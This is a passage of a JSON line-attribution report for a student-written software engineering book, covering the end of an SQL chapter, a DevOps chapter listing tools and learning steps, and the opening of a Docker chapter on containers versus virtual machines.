        "content": "The biggest issue in SQL is with regards to the syntax and features."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Although SQL databases use established \u003ctooltip content\u003d\"American National Standard Institutes\"\u003eANSI\u003c/tooltip\u003e \u0026 \u003ctooltip content\u003d\"International Organization for Standardization\"\u003eISO\u003c/tooltip\u003e standards, some RDBMSs %%(like PostgreSQL, for example)%% add proprietary extensions to standard SQL."
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "Due to this, the available feature set can vary according to what you\u0027re using."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "Furthermore, there may be \u003ctooltip content\u003d\"case-sensitivity, date and time format, functions available out-of-the-box, etc.\"\u003eminor changes in the syntaxes\u003c/tooltip\u003e across RDBMSs."
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "These factors can make SQL confusing and frustrating to use when switching across RDBMSs, since you would have to change your SQL queries."
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "---"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## How to Get Started With SQL?"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "As you saw in the example in the earlier section, SQL is really not that complex. It is easy to learn, even for beginners who do not have any prior experience with databases."
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "To get started with SQL, you can either just use an online SQL playground or install an RDBMS. There are many free RDBMSs available like [PostgreSQL](https://www.postgresql.org/) and [MySQL](https://dev.mysql.com/downloads/)."
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "At the early stages of learning SQL, you can even use online editors like [DB Fiddle](https://www.db-fiddle.com/) %%(supports MySQL and SQLite)%% or [SqliteOnline](https://sqliteonline.com/) %%(supports SQLite)%% since they allow you to start learning without the hassle of setting up anything."
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some recommended steps for learning SQL:"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Understand RDBMS**: Before jumping into the SQL language, refer to this book\u0027s [\u003ctooltip content\u003d\"DataBase Management System\"\u003e**DBMS**\u003c/tooltip\u003e]({{baseUrl}}/contents/data/databases/databases.html) chapter to understand the basic database concepts. More specifically, understand the basic concepts of RDBMS by going through Tutorials Point\u0027s [**SQL- RDBMS Concepts**](https://www.tutorialspoint.com/sql/sql-rdbms-concepts.htm) page. This is not _essential_, but will give you a better high-level understanding before diving into programming."
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Learn SQL Syntax**: These are some recommended resources that you can use to learn the SQL language."
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "    - The [**Guru99 SQL Tutorial for Beginners**](https://www.guru99.com/sql.html) is a good course for beginners. It is well organized and provides comprehensive information, which will ensure that you know the basics well."
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 155,
        "author": {
          "gitId": "-"
        },
        "content": "    - The [**W3Schools SQL Tutorial**](https://www.w3schools.com/sql/default.asp) is a useful, interactive written tutorial in which you can run and modify SQL queries to see the examples in action."
      },
      {
        "lineNumber": 156,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 157,
        "author": {
          "gitId": "-"
        },
        "content": "    - In order to keep track of and remember the syntaxes that you\u0027re learning, you can refer to the [**W3Schools SQL Quick Reference Guide**](https://www.w3schools.com/sql/sql_ref_mysql.asp). This is particularly useful when you want to look up specific information quickly."
      },
      {
        "lineNumber": 158,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 159,
        "author": {
          "gitId": "-"
        },
        "content": "1. **Use SQL in practice**: Look into different RDBMSs and decide which one you want to work with. You can start by comparing the 3 mentioned in this [**Oracle vs MySQL vs SQL Server**](https://blog.udemy.com/oracle-vs-mysql-vs-sql-server/) post and work from there. Then, set up the corresponding RDBMS and integrate it with an application. This will give you good experience and exposure to how databases are used in practice."
      },
      {
        "lineNumber": 160,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 161,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "    In the case of MySQL, a good resource for getting started with this is [**MySQLTutorial.org**](https://www.mysqltutorial.org/). The `Interfaces` section of the website contains multiple tutorials explaining how to integrate and work with MySQL from [Node.js](https://www.mysqltutorial.org/mysql-nodejs/), [Java](https://www.mysqltutorial.org/mysql-jdbc-tutorial/), [Python](https://www.mysqltutorial.org/python-mysql/) and more."
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 3,
      "jamessspanggg": 1,
      "iskandarzulkarnaien": 9,
      "-": 148
    }
  },
  {
    "path": "contents/devops/DevOps.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: DevOps"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# DevOps"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [John Yong](https://github.com/whipermr5)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "## What is DevOps?"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e \u0026ldquo;DevOps is the practice of operations and development engineers participating together in the entire service lifecycle, from design through the development process to production support.\u0026rdquo; \u0026mdash; [the agile admin](https://theagileadmin.com/what-is-devops/)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "The term **DevOps** comes from the amalgamation of two words - **Dev**elopment and **Op**eration**s**. While there are many definitions and opinions out there about what DevOps really is, and no one true answer, most agree that it is the idea of Developers and Operations working together to achieve a goal ([source](https://blog.xebialabs.com/2015/04/23/best-guide-to-getting-started-in-devops/)). This involves a **shift in mindset** away from the traditional view of Development and Operations as two distinct teams with few overlapping responsibilities, to a new mindset where developers and operations engineers communicate, collaborate and share the responsibility of developing and delivering software."
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Indeed, some see DevOps as a culture shift that involves more than just developers and operations teams, but also everyone involved in delivering value to end users, including testers and Quality Assurance, Project Management and Human Resources teams ([source](https://blog.nwcadence.com/devops-culture-not-team/)). However, this document will focus more on the development and operations side of DevOps, which is what budding software engineers like yourself need to know."
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e Tip: for a comprehensive discussion of what DevOps is and is not, refer to *the agile admin*\u0027s article, [What Is DevOps?](https://theagileadmin.com/what-is-devops/)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "## Aspects of DevOps"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "While DevOps is predominantly an organisational culture and mindset, there are several aspects it covers that you, as a software engineering student, need to be familiar with before entering the industry. These are outlined in the DevOps toolchain ([source](https://en.wikipedia.org/wiki/DevOps#DevOps_toolchain)):"
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "1. Code"
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "2. Build"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "3. Test"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "4. Package"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "5. Release"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "6. Configure"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "7. Monitor"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "These can be roughly summarised into four major aspects:"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "### Code Development \u0026 Review"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "This includes using version control tools, following a process when developing, frequently merging code with a central branch, and going through a code review process."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "#### Relevant Tools"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "Version Control Software (VCS)"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "- [Git](https://git-scm.com/)"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "- [Mercurial](https://www.mercurial-scm.org/)"
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "Web-based Hosted VCS"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "- [GitHub](https://github.com/)"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "- [GitLab](https://about.gitlab.com/)"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "- [BitBucket](https://bitbucket.org/)"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "### Build \u0026 Test Automation"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "Involves using continuous integration tools that automatically build and test your software upon every push to a code repository (Git, Mercurial, etc.), so you don\u0027t have to do it yourself. They can also be configured to run on specific branches or pull requests."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "#### Relevant Tools"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Local Build Tools"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e In addition to automating builds, these also manage dependencies"
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "- [Gradle](https://gradle.org/)"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [Ant](https://ant.apache.org/)"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "- [Maven](https://maven.apache.org/)"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "Hosted CI Tools"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e These integrate with hosted VCS solutions like GitHub"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "- [Travis CI](https://travis-ci.org/)"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "- [Circle CI](https://circleci.com/)"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "- [Jenkins](https://jenkins.io/) (self-hosted)"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "### Deployment \u0026 Infrastructure"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "This is about getting your software to run in a live server environment so that it is publicly accessible to end users. It also involves packaging your app such that it can be deployed in different environments."
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "#### Relevant Tools"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "Infrastructure Management Tools"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "- [Vagrant](https://www.vagrantup.com/) - portable virtual development environments"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "- [Docker](https://www.docker.com/) - deployment of applications inside software containers"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ansible](https://www.ansible.com/) - automated software provisioning, configuration management and deployment"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "- [Puppet](https://puppet.com/) - configure infrastructure with declarative code"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "Cloud Infrastructure"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "- [DigitalOcean](https://www.digitalocean.com/) - cloud computing for developers"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "- [Amazon Web Services](https://aws.amazon.com/) - scalable cloud computing services"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "### Monitoring"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "After deployment, monitoring the system for any defects or potential defects is essential to minimise outages (infrastructure monitoring). This aspect also includes application performance management (APM) and log analysis."
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "#### Relevant Tools"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "- [Icinga](https://www.icinga.com/) - open source system and network monitoring [[install guide]](https://www.digitalocean.com/community/tutorials/how-to-use-icinga-to-monitor-your-servers-and-services-on-ubuntu-14-04)"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "- [Monit](https://mmonit.com/monit/) - open source monitoring utility that also does auto recovery of services [[install guide]](https://www.digitalocean.com/community/tutorials/lemp-stack-monitoring-with-monit-on-ubuntu-14-04)"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "- [ELK (Elasticsearch, Logstash, Kibana)](https://www.elastic.co/products) - analytics tools that work well together [[install guide]](https://www.digitalocean.com/community/tutorials/how-to-install-elasticsearch-logstash-and-kibana-elk-stack-on-ubuntu-14-04)"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "## Getting Started"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "As a software engineering student, the best way to get started is to gain some practical experience by trying out the various tools mentioned above. This is a suggested process you can try:"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": "1. Contribute to an open source project on GitHub. Make several pull requests and get used to the flow of code review and frequent integration with the base branch."
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "2. Integrate build and test automation into an existing project that doesn\u0027t already use it (perhaps one of your past programming assignments). Write test cases for the project, put the project on GitHub, integrate Travis CI with it and get Travis to run the tests every time you push a commit."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "3. Get familiar with the Ops side of things. Get a DigitalOcean droplet (use free credits from the GitHub education pack) and deploy a web app (any past project that you ran on localhost all the time). Try installing and configuring OpenVPN on the droplet (plus point - you get your own private VPN!)"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "4. Install a monitoring tool on the same droplet to notify you if the web app or the OpenVPN service goes down. Get it to email/ send you a Telegram message if this happens, and test it by manually stopping the web server/ OpenVPN."
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "5. Bonus: Try setting up automated deployment so your web app gets updated on the fly when code is pushed to the release branch."
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "## Useful Links"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": "### Quick References"
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "- [What is DevOps?](https://aws.amazon.com/devops/what-is-devops/) - a concise article by Amazon Web Services"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": "- [The Essential DevOps Terms You Need to Know](https://blog.xebialabs.com/2016/03/21/essential-devops-terms/) - understand the most commonly used terms in the industry"
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": "### Further Reading"
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "- [Best Guide to Getting Started In DevOps](https://blog.xebialabs.com/2015/04/23/best-guide-to-getting-started-in-devops/) - recommends various places you can read up more on the topic"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "- [9½ Simple Steps On How To Start With DevOps Today](https://devops.com/9%C2%BD-simple-steps-start-devops-today/) - includes practical suggestions like using a code static analysis tool"
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "- [A Pragmatic Guide to Getting Started with DevOps](https://www.ca.com/us/lpg/~/media/Files/eBooks/a-pragmatic-guide-to-getting-started-with-devops.pdf) - more of a management point of view but interesting"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "- [The DevOps Handbook: How to Create World-Class Speed, Reliability, and Security in Technology Organizations](https://books.google.com.sg/books/about/The_Devops_Handbook.html?id\u003dXrQcrgEACAAJ) - about managing tech organisations, written by a CTO"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "jamessspanggg": 3,
      "-": 125
    }
  },
  {
    "path": "contents/docker/Docker.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Docker"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Docker"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "**Authors: [Rahul Rajesh](https://github.com/rrtheonlyone)**"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is Docker?‎](#what-is-docker)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why Docker?‎](#why-docker)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [How to use Docker?‎](#how-to-use-docker)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Additional tools - Docker Swarm and Kubernetes‎](#additional-tools-docker-swarm-and-kubernetes)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Conclusion / Further Readings‎](#conclusion-further-readings)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Monika Manuela Hengki](https://github.com/monmanuela), [Wang Junming](https://github.com/junming403)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": "### What is Docker?"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"Docker_Logo.png\" alt\u003d\"Docker Logo\" width\u003d\"45%\"\u003e"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 1. Docker Logo_ [(source)](https://www.theverge.com/circuitbreaker/2018/5/25/17386716/docker-kubernetes-containers-explained)\u003c/sub\u003e"
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "Docker is a platform that is used to develop, deploy and run applications inside “containers”."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "\u003e A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another. \u003csub\u003e--[Docker Website](https://www.docker.com/resources/what-container)\u003c/sub\u003e"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "The idea of containers is not so different from _Virtual Machines_ (VM). Before the rise of Docker, people used VMs. A VM is an emulation of a real computer that is used to isolate an application and its dependencies into a self-contained unit that can run anywhere.  For example, you could use a VM to run an application on a Linux system even though you are running Windows."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "However, a container posses some advantages over a VM. As per the [Docker Documentation](https://docs.docker.com/get-started/), a container runs natively on Linux and shares the kernel of the host machine with other containers. It runs a discrete process, taking no more memory than any other executable, making it lightweight."
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cpic src\u003d\"Docker_Architecture.png\" alt\u003d\"Docker Architecture\" width\u003d\"100%\"\u003e"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "  "
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "  \u003csub\u003e_Figure 2. Difference between a container and a VM_ [(source)](https://docs.docker.com/get-started)\u003c/sub\u003e"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/pic\u003e"
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "By contrast, a virtual machine (VM) runs a full-blown “guest” operating system with virtual access to host resources through a hypervisor. In general, VMs provide an environment with more resources than most applications need. "
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "The idea behind Docker is to spin up a lightweight container that is able to execute services quickly without the overhead of a full-blown VM. With this in mind, let us move onto the the reasons to switch over to Docker. The subtleties between a container and VM will become more clear as you read the next few sections."
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
